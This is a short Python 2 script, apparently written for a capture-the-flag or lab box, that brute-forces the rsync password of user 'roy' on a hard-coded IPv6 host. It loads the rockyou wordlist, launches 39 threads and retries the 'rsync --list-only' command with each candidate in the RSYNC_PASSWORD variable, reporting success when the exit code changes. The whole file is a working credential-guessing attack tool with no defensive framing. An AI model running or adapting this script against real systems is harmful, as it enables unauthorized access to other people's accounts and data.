#!/usr/bin/python

#can be done in shell script but eh lets try for funz
import threading
import Queue
import socket
import os
import subprocess
import sys
 
usernameList = ["roy"]
passwordList = open('rockyou8.txt','r').read().splitlines()
command = "rsync --list-only rsync://roy@[dead:beef::250:56ff:fea2:dea3]:8730/home_roy 2>/dev/null"

class WorkerThread(threading.Thread) :

	def __init__(self, queue, tid) :
		threading.Thread.__init__(self)
		self.queue = queue
		self.tid = tid

	def run(self) :
		while True :
			username = None 
 
			try :
				username = self.queue.get(timeout=1)
 
			except 	Queue.Empty :
				return
 
			try :
				for password in passwordList:
					
					my_env = os.environ
					my_env["RSYNC_PASSWORD"] = password
					proc = subprocess.Popen(command, stdout=subprocess.PIPE,env=my_env, shell=True)
					#proc = subprocess.Popen(command, stdout=os.DEVNULL,env=my_env, shell=True)
					(out, err) = proc.communicate()

					if proc.returncode != 5:
						print "[+] Found password! for " + username + " [" + password + "]"
						break

			except :
				raise 
 
			self.queue.task_done()
 
queue = Queue.Queue()
 
threads = []
for i in range(1, 40) : # Number of threads
	worker = WorkerThread(queue, i) 
	worker.setDaemon(True)
	worker.start()
	threads.append(worker)
 
for username in usernameList :
	queue.put(username)     
 
queue.join()
 
# wait for all threads to exit 
 
for item in threads :
	item.join()
 
print "Testing Complete!"
